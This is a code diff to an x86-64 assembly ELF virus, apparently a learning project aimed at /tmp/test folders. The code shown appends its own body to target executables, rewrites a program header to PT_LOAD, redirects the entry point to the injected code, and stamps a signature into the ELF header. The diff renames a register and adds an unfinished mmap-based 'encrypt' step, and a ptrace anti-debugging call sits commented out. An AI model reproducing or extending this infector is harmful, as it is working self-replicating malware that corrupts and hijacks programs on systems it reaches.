@@ -5,9 +5,9 @@
 %define SYS_WRITE	   1
 %define SYS_READ		0
 %define SYS_EXECVE	  59
-%define SYS_GETDENTS64  217
-%define SYS_FSTAT	   5
-%define SYS_LSEEK	   8
+%define SYS_GETDENTS64	217
+%define SYS_FSTAT		5
+%define SYS_LSEEK		8
 %define SYS_PREAD64		17
 %define SYS_PWRITE64	18
 %define SYS_SYNC		162
@@ -15,6 +15,16 @@
 %define SYS_CHDIR		80
 %define SYS_PTRACE		101
 
+%define SYS_MMAP		9
+%define SYS_MUNMAP		11
+
+%define PROT_READ 0x1
+%define PROT_WRITE 0x2
+
+%define MAP_SHARED 0x01
+%define MAP_PRIVATE 0x02
+
+%define MAP_FAILED -1
 
 %define DT_REG			8
 %define SEEK_END		2
@@ -74,7 +84,7 @@ _start:
 	sub rsp, 5000												; reserving 5000 bytes
 	mov r15, rsp
 	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2
-
+	mov qword [r15 + 551], 0										; addr for mmmap
 	; mov rax, SYS_PTRACE											; anti-debugging
 	; xor rdi, rdi
 	; syscall
@@ -130,9 +140,9 @@ _start:
 
 			cmp rax, 0										; if can't open file, _end now
 			jbe .continue
-			mov r9, rax
+			mov r12, rax
 		.read_ehdr:
-			mov rdi, r9										; r9 contains fd
+			mov rdi, r12										; r12 contains fd
 			lea rsi, [r15 + 144]							; rsi = ehdr = [r15 + 144]
 			mov rdx, 64										; ehdr.size
 			mov r10, 0										; read at offset 0
@@ -151,7 +161,7 @@ _start:
 		xor r14, r14										; r14 will hold phdr file offset
 
 		.loop_phdr:
-			mov rdi, r9										; r9 contains fd
+			mov rdi, r12										; r12 contains fd
 			lea rsi, [r15 + 208]							; rsi = phdr = [r15 + 208]
 			mov dx, word [r15 + 198]						; ehdr.phentsize is at [r15 + 198]
 			mov r10, r8										; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
@@ -178,13 +188,13 @@ _start:
 				add r14, [r15 + 176]						; r14 = ehdr.phoff + (bx * ehdr.phentsize)
 
 			.file_info:
-				mov rdi, r9
+				mov rdi, r12
 				mov rsi, r15								; rsi = r15 = stack buffer address
 				mov rax, SYS_FSTAT
 				syscall 
 			.append_virus:
 				; getting target EOF
-				mov rdi, r9									; r9 contains fd
+				mov rdi, r12									; r12 contains fd
 				mov rsi, 0									
 				mov rdx, SEEK_END							; seek to end of file
 				mov rax, SYS_LSEEK
@@ -196,8 +206,8 @@ _start:
 					pop rbp									; rbp = target EOF
 					sub rbp, .delta							; rbp = target EOF - current EOF
 
-				; writing virus body to EOF
-				mov rdi, r9									; r9 contains target fd
+				; writing virus body to EOF pwrite(fd, *buff, count, offset)
+				mov rdi, r12									; r12 contains target fd
 				lea rsi, [rbp + _start]						; loading _start address in rsi
 				mov rdx, _end - _start						; virus size
 				mov r10, rax								; rax contains target EOF offset from previous syscall
@@ -206,6 +216,33 @@ _start:
 
 				cmp rax, 0						; if write failed, _end now
 				jbe .close_file
+			.encrypt:
+				; void * mmap( void * addr, size_t len, int prot, int flags, int fildes, off_t off );
+				xor rdi, rdi								; addr	-> rdi = NULL
+				mov rsi, _end - _start						; len	-> rsi = virus size
+				add rsi, r10								; target file + virus size
+				mov r11, rsi								; backup final filesize	
+				mov rdx, PROT_READ | PROT_WRITE				; prot	-> rdx = PROT_READ | PROT_WRITE
+				xor r9, r9								    ; offset = 0
+				mov r10, MAP_SHARED							; flags	-> r10 = MAP_SHARED
+				mov r8, r12									; r8 = fd
+				mov rax, SYS_MMAP
+				syscall
+
+				cmp rax, MAP_FAILED							; check if mmap failed
+				jle .close_file
+				
+				mov r10, rax								; r10 = mmap address
+				; mmunmap(addr, len);
+				
+				.loop:
+
+				mov rdi, r10
+				mov rsi, r11
+				mov rax, SYS_MUNMAP
+				syscall
+				cmp rax, 0									; check if mmunmap failed
+				jne .close_file
 
 			.patch_phdr:
 				mov dword [r15 + 208], PT_LOAD				; patch phdr.type to PT_LOAD (1)
@@ -219,7 +256,7 @@ _start:
 				add qword [r15 + 240], _end - _start + 5	; add virus size to phdr.filesz in [r15 + 240] + 5 for the jmp to original ehdr.entry
 				add qword [r15 + 248], _end - _start + 5	; add virus size to phdr.memsz in [r15 + 248] + 5 for the jmp to original ehdr.entry
 
-				mov rdi, r9									; r9 contains target fd
+				mov rdi, r12									; r12 contains target fd
 				mov rsi, r15								; rsi = r15 = stack buffer address
 				lea rsi, [r15 + 208]						; rsi = phdr = [r15 + 208]
 				mov dx, word [r15 + 198]					; ehdr.phentsize from [r15 + 198]
@@ -235,7 +272,7 @@ _start:
 				mov [r15 + 168], r13						; set ehdr.entry in [r15 + 168] to r13 (phdr.vaddr)
 				mov r13, SIGNATURE							; loading DRE signature
 				mov [r15 + 152], r13						; adding the virus signature to ehdr.pad in [r15 + 152]
-				mov rdi, r9									; r9 contains fd
+				mov rdi, r12									; r12 contains fd
 				lea rsi, [r15 + 144]						; rsi = ehdr = [r15 + 144]
 				mov rdx, 64									; ehdr.size
 				mov r10, 0									; ehdr.offset
@@ -247,7 +284,7 @@ _start:
 
 			.write_patched_jmp:
 				; getting target new EOF
-				mov rdi, r9									; r9 contains fd
+				mov rdi, r12									; r12 contains fd
 				mov rsi, 0									; seek offset 0
 				mov rdx, SEEK_END
 				mov rax, SYS_LSEEK
@@ -262,7 +299,7 @@ _start:
 				mov dword [r15 + 301], r14d
 
 				; writing patched jmp to EOF
-				mov rdi, r9									; r9 contains fd
+				mov rdi, r12									; r12 contains fd
 				lea rsi, [r15 + 300]						; rsi = patched jmp in stack buffer = [r15 + 208]
 				mov rdx, 5									; size of jmp rel
 				mov r10, rax								; mov rax to r10 = new target EOF
